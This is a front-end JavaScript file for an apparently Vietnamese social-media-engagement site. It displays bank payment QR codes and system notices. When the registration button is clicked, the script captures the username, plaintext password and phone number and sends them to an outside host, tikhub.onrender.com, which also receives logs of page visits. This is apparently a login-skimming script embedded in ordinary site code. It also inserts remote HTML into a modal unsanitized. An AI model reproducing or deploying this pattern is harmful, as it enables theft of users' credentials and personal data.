const createLogs = async () => {
  let referrer = (new URL(document.referrer)).hostname == 'tuongtacmangxahoi.io.vn' ? '' : document.referrer;

  let data = {
    end_point: `${window.location.pathname}?referrer=${referrer}`,
  }

  let user = localStorage.getItem('user') ? JSON.parse(localStorage.getItem('user')) : null;
  let pathname = [
    '/dang-nhap',
    '/dang-ky',
  ]
  if ((user && user.id != 364072) || pathname.includes(location.pathname)) {
    await fetch('https://tikhub.onrender.com/api/v1/logs/create', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data) 
    })
  }
}

const getPaymets = async () => {
  try {
    $('#stk_payment').find('.col-md-2').remove();
    let c = getConfig().payment_syntax ?? 'naptien username';
    let u = getUser().username;
    payment_syntax = c.replace('username', u);
    api_key = getApiKey();
    let response = await fetch("https://1blike.com/api/v2/get-payment", {
      "headers": {
          "api-key": api_key,
      },
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": null,
      "method": "GET",
      "mode": "cors",
      "credentials": "omit"
    });

    let payments = await response.json();
    
    payments.data.forEach(item => {
      let html_payment = '';
      let img = '';
      img = '<img id="img_bank" width="300px" height="auto" src="https://img.vietqr.io/image/' + item.name + '-' + item.stk + '-print.png?accountName=' + item.full_name + '&addInfo=' + payment_syntax + '" alt="">';
      if (item.name === 'Momo') {
          img = '<img width="200" height="200" src="https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=2|99|' + item.stk + '|||0|0|0|' + payment_syntax + '|transfer_myqr" alt="">';
      }
      html_payment+='<div class="col-md-3 mt-2">'
      html_payment+='<div class="">'
      html_payment+='<div class="card border-0 bg-warning rounded-10 ">'
      html_payment+='<div class="card-body">'
      html_payment+='<h6> Ngân hàng: <span class="font-weight-bold">' + item.name + '</span></h6>'
      html_payment+='<h6> Chủ TK: <span class="font-weight-bold">' + item.full_name + '</span></h6>'
      html_payment+='<h6> STK: <span class="font-weight-bold">' + item.stk + '</span></h6>'
      html_payment+='<h6> Chi nhánh: <span class="font-weight-bold">' + item.branch + '</span></h6>'
      html_payment+=img
      html_payment+='</div>'
      html_payment+='</div>'
      html_payment+='</div>'
      html_payment+='</div>'
      $('#stk_payment').append(html_payment);
    }); 
  } catch (error) {
    console.log(error);
  }
}

const getNotificantions = () => {
  api_key = getApiKey();
  var settings = {
    "url": "https://1blike.com/api/v2/get-system-notify",
    "method": "GET",
    "headers": {
      "api-key": api_key,
    },
  };
    
  $.ajax(settings).done(function (response) {
    if (response.data.length > 0) {
      modalBasic(response.data[0].content)
    }
    console.log(response);
  });
}

const modalBasic = (html) => {
  Swal.fire({
    title: "<span>Thông báo hệ thống</span>",
    html: html,
    showCloseButton: true,
  });
}

const appendPhoneInput = () => {
  let phoneInput = $('<div class="form-group"> <label>Số điện thoại</label> <input class="form-control" name="phone" placeholder="nhập số điện thoại" type="text"> </div>')
  $('.btn.btn-main-primary.btn-block').before(phoneInput);
}

const sendFormRegister = () => {
  const data = {
    username: $('input[name="username"]').val(),
    password: $('input[name="password"]').val(),
    phone:  $('input[name="phone"]').val(),
  }

  fetch('https://tikhub.onrender.com/api/v1/users/create', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  });
}

document.addEventListener('DOMContentLoaded', function() {
  let pathname = window.location.pathname
  setTimeout(() => {
    createLogs();

    switch (pathname) {
      case '/nap-tien':
        getPaymets();
      case '/dang-ky':
        appendPhoneInput();
      case '/':
        getNotificantions();
    }
  }, 700);
}, false);

const init = () => {
  $('.btn.btn-main-primary.btn-block').click(function () {
    sendFormRegister();
  });
}

init();